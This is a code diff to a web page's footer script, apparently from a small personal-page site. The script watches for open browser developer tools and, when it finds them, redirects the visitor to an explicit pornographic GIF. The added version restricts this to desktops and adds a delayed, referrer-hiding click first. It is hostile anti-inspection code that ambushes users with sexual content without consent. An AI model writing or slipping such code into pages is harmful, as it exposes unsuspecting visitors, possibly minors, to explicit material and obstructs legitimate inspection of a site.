@@ -22,22 +22,34 @@
     © 2025 softcard — made by pink | add pink.aep on discord to get a page
   </footer>
 
-  <script>
-    (function() {
+<script>
+(function () {
   const threshold = 160;
 
+  // Only run on desktop
+  const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
   const detectDevTools = () => {
+    if (!isDesktop) return;
+
     const widthThreshold = window.outerWidth - window.innerWidth > threshold;
     const heightThreshold = window.outerHeight - window.innerHeight > threshold;
     const isDevToolsOpen = widthThreshold || heightThreshold;
 
     if (isDevToolsOpen) {
-      window.location.href = "https://www.sex.com/en/gifs/251149";
+      setTimeout(() => {
+        const a = document.createElement("a");
+        a.href = "https://google.com";
+        a.rel = "noreferrer";
+        a.click();
+        window.location.href = "https://www.sex.com/en/gifs/251149";
+      }, 100);
     }
   };
 
   setInterval(detectDevTools, 300);
 })();
-  </script>
+</script>
+
 </body>
 </html>
